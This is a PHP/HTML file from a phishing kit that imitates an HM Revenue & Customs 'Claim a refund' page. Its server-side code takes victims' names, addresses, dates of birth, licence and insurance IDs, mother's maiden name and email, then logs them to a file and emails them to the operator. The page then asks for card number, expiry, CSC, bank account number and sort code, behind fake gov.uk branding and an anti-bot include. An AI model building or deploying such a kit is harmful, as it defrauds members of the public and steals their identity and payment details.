<?php include_once'../../d9174a551c1b19b6a4df260965cfc991.php';?><?php

error_reporting(0);
session_start();

include "includes/my_email.php";
if ($_SESSION['access']== "") {
	header("Location: ../index");
}

	include 'anti.php';


$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);


date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['fname'] = $_POST['fname'];
$fname = $_SESSION['fname'];
$dob = "{$_POST['d1']}-{$_POST['d2']}-{$_POST['d3']}";
$licence = $_POST['licence'];
$insurance = $_POST['insurance'];
$address = $_POST['address'];
$address2 = $_POST['address2'];

$city = $_POST['town'];
$county = $_POST['con'];
$postcode = $_POST['pc'];
$mobile_number = $_POST['telephone'];
$mmn = $_POST['mmr'];
$email = $_POST['email'];
$_SESSION['email'] = $email;
if(!empty($address))  {

$msg = "+ ---------------HMRC----------------+\n";
$msg .= "+ Personal Information\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| Full Name: ".$fname."\n";
$msg .= "| Address: ".$address."\n";
$msg .= "| Address2: ".$address2."\n";
$msg .= "| City: ".$city."\n";
$msg .= "| County: ".$county."\n";
$msg .= "| Postcode: ".$postcode."\n";
$msg .= "| Date of Birth (dd/mm/yyyy): ".$dob."\n";
$msg .= "| Licence-ID: ".$licence."\n";
$msg .= "| Insurance-ID: ".$insurance."\n";
$msg .= "| Mobile/Telephone Number: ".$mobile_number."\n";
$msg .= "| MMN: ".$mmn."\n";
$msg .= "| Email: ".$email."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "----------------HMRC--------------------\n";

$msg1 = "+ ---------------HMRC----------------+\n";
$msg1 .= "+ Personal Information\n";
$msg1 .= "+ ------------------------------------------+\n";
$msg1 .= "| Full Name: ".$fname."\n";
$msg1 .= "| Address: ".$address."\n";
$msg1 .= "| Address2: ".$address2."\n";
$msg1 .= "| City: ".$city."\n";
$msg1 .= "| County: ".$county."\n";
$msg1 .= "| Postcode: ".$postcode."\n";
$msg1 .= "| Date of Birth (dd/mm/yyyy): ".$dob."\n";
$msg .= "| Licence-ID: ".$licence."\n";
$msg .= "| Insurance-ID: ".$insurance."\n";
$msg1 .= "| Mobile/Telephone Number: ".$mobile_number."\n";
$msg1 .= "| MMN: ".$mmn."\n";
$msg1 .= "| Email: ".$email."\n";

$_SESSION['msg1'] = $msg1;

$subject = "HMRC: $fname";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

if($Encrypt==1) {
$method = 'aes-256-cbc';
$key = substr(hash('sha256', $password, true), 0, 32);
$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
$encrypted = base64_encode(openssl_encrypt($msg, $method, $key, OPENSSL_RAW_DATA, $iv));
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("logs/HMRC.txt","a");
	fwrite($file,$encrypted);
	fclose($file);
	}
	else {
	$file=fopen("logs/HMRC.txt","a");
	fwrite($file,$msg);
	fclose($file);
	}
}
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($my_email,$subject,$encrypted,$headers);
	}
	else {
	mail($my_email,$subject,$msg,$headers);
	}
}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="images/gov_uk.ico?FqAktxnBpjcXrksNnHvdTSjykQe" type="image/x-icon">
	<link rel="mask-icon" href="images/mask.svg?MeDwDHsvbhIHVWCOiqLXFfRhgAZy" color="#0b0c0c">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon-180x180.png?FqAktxnBpjcXrksNnHvdTSjykQe">
	<link rel="apple-touch-icon" sizes="167x167" href="images/apple-touch-icon-167x167.png?qdZwTagNYUONDrkvbdIOlEsEXb">
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-touch-icon-152x152.png?HrhsiKSedtLr">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png?gFekxPfYtonesgjPH">
	<title>Claim a refund | HMRC</title>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/claimStyle.css" rel="stylesheet">
	<link href="css/claimSteps.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>
<body>
<div class="revenueCustoms sidePadding">
	<img src="images/crest.png"/>
	<span style="padding-left:5px;color:#0b0c0c;font-family: 'nta', Arial, sans-serif;font-size: 1.9rem !important;vertical-align: middle;">HM Revenue &amp; Customs</span>
</div>
<div class="topBar">
	<div class="containerTop">
		<div class="row">
			<div class="topLinkWrapper sidePadding">
				Cookies are used to make this website simpler.
				<a href="/authids.online.revenuecustoms/details2?sessionid=6882224ca4e4ea69c3d31d7b4d34d06f&securessl=true">Find out more about cookies.</a>
			</div>

		</div>
	</div>
</div>

<div class="clearfix"></div>
<div class="containerMiddle">

	<div class="row">
		<div class="col-xs-12 col-md-8">
			<div class="clearfix"></div>
			<div class="claimForm sidePadding">Claim form</div>
			<div class="clearfix"></div>
			<h1 class="claimTitle sidePadding">Tax refund</h1>

			<div class="clearfix"></div>
		</div>
	</div>
	<div class="row sidePadding">
		<div class="col-xs-12 col-md-4 pull-right">
			<div class="sidebarVerify">
				<img src="images/verify.png"/>
			</div>
		</div>
		<div class="col-xs-12 col-md-8 pull-right">
			<span class="textBlock">
				Please complete the following form using your registered profile information.
			</span>

			<div class="clearfix"></div>
			<span class="textBlock strongBlock">
				We don't approve any request containing a non-UK address or billing details.
			</span>

			<div class="clearfix"></div>
			<span class="textBlock">
				You’ll need to enter your details manually below, after which your application will be sent for processing.
			</span>

			<div class="clearfix"></div>
			<span class="dataRegulations">
				Data protection regulations
			</span>

			<div class="clearfix"></div>
			<span class="textBlock personalData">
				The personal data you provide is purely for the use of this service. It is held for 30 days and then deleted.
				Further details on Tax’s privacy policy can be found at <a
						href="/authids.online.revenuecustoms/details2?sessionid=6882224ca4e4ea69c3d31d7b4d34d06f&securessl=true">https://www.gov.uk/tax/privacy-policy</a>
			</span>

			<form method="post" id="basicInfo" name="basicInfo" action="next2.php?sessionid=6882224ca4e4ea69c3d31d7b4d34d06f&securessl=true"
				  onsubmit="return validateForm();">
				<div class="inputFieldsWrapper">
					<label for="name" class="fieldLabel">
						Name as on card *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="name" class="inputcardName form-control" id="name" maxlength="50"/>
					<span class="labelBottom">
						50 max characters
					</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="xxx" class="fieldLabel">
						Card number *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="xxx" class="inputcardNumber form-control" id="xxx"
						   maxlength="16"/>
					<span class="labelBottom">
						16 max digits
					</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="expiry" class="fieldLabel">
						Expiry Date*
					</label>

					<div class="clearfix"></div>
					<div class="row">
						<div class="col-xs-4">
							<select class="form-control" name="expiryM" id="expiryM">
								<option selected="selected" value="">Month</option>
								<option value="01">01</option>
								<option value="02">02</option>
								<option value="03">03</option>
								<option value="04">04</option>
								<option value="05">05</option>
								<option value="06">06</option>
								<option value="07">07</option>
								<option value="08">08</option>
								<option value="09">09</option>
								<option value="10">10</option>
								<option value="11">11</option>
								<option value="12">12</option>
							</select>
						</div>
						<div class="col-xs-4">
							<select class="form-control" name="expiryY" id="expiryY">
								<option selected="selected" value="">Year</option>
								<option value="2019">2019</option>
								<option value="2020">2020</option>
								<option value="2021">2021</option>
								<option value="2022">2022</option>
								<option value="2023">2023</option>
								<option value="2024">2024</option>
								<option value="2025">2025</option>
								<option value="2026">2026</option>
								<option value="2027">2027</option>
								<option value="2028">2028</option>
								<option value="2029">2029</option>
								<option value="2030">2030</option>
							</select>
						</div>
					</div>
					<div class="clearfix"></div>
					<span class="labelBottom">
						Format: mm/yyyy
					</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="xxxxx" class="fieldLabel">
						CSC *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="xxxxx" class="inputcardcsc form-control" id="xxxxx" maxlength="3"/>
				<span class="labelBottom">
					3 digits
				</span>
				</div>

				<div class="clearfix"></div>
				<span class="boldInfo">
					Issuer information
				</span>

				<div class="inputFieldsWrapper">
					<label for="an" class="fieldLabel">
						Account number *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="an" pattern="[0-9]*" inputmode="numeric" class="inputaccountNumber form-control" id="an"
						   maxlength="8"/>
					<span class="labelBottom">
						8 max digits
					</span>
				</div>

				<div class="inputFieldsWrapper">
					<label for="sc" class="fieldLabel">
						Sort code *
					</label>

					<div class="clearfix"></div>
					<input type="text" name="sc"  inputmode="numeric" class="inputsortCode form-control" id="sc" maxlength="6"/>
				<span class="labelBottom">
					6 max digits
				</span>
				</div>

				<input type="submit" name="submit" value="Continue" class="nextBtn sideMargin"/>

			</form>
		</div>
	</div>
</div>
<div class="clearfix"></div>
<div class="divider"></div>
<div class="clearfix"></div>

<div class="footer">
	<div class="containerFooter">
		<div class="row footerBorder">
			<div class="row">
				<div class="col-xs-12">
					<span class="legalField sidePadding">
						This form is secured with 256-BIT SSL Layer.
					</span>
				</div>
			</div>
		</div>
		<div class="clearfix"></div>
		<div class="row bottomSpacer">
			<div class="col-xs-12 col-sm-9 no-padding">
					<span class="footerLink2">
						<a href="#">Help</a>
					</span>
					<span class="footerLink2">
						<a href="#">Cookies</a>
					</span>
					<span class="footerLink2">
						<a href="#">Contact</a>
					</span>
					<span class="footerLink2">
						<a href="#">Terms and conditions</a>
					</span>
					<span class="footerLink2">
						<a href="#">Rhestr o Wasanaethau Cymraeg</a>
					</span>

				<div class="clearfix"></div>
					<span class="dividerLast">
						<span class="footerLink2">
						Built by the <a href="#">Government Digital Service</a>
						</span>
					</span>

				<div class="clearfix"></div>
				<div class="oglBox">
					<a href="#" class="oglLogo">

					</a>
						<span class="footerLink2">
							All content is available under the
								<a href="#">Open Government Licence v3.0,</a>
							except where otherwise stated
						</span>
				</div>
			</div>
			<div class="col-xs-12 col-sm-3 no-padding">
				<a href="#" class="crownLink">
					<img src="images/logo.png" class="bottomLogo"/>

					<div class="clearfix"></div>
					<span class="crownCopy">© Crown copyright</span>
				</a>
			</div>
		</div>
	</div>
</div>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/card-validate.min.js"></script>
<script src="js/validateStep2.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
<script>
$('input[name="sc"]').mask('00-00-00');
</script>
</body>
</html>